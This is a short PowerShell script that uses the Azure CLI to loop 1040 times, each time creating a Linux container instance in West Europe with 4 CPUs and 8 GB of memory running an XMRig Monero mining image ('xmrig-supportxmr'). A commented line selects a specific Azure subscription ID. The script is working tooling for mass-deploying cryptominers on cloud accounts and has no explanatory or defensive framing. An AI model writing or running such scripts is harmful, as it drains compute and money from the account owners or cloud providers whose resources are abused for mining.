#az account set --subscription 10b9ff10-0535-4ed0-b2cb-be085edb855a
$i=0
while($i -lt 1040)
{
    $i++
	az container create -g main --name westeuropemachine0$i --image milennialsafezone/xmrig-supportxmr:cpu --os-type Linux --cpu 4 --memory 8  --location westeurope
}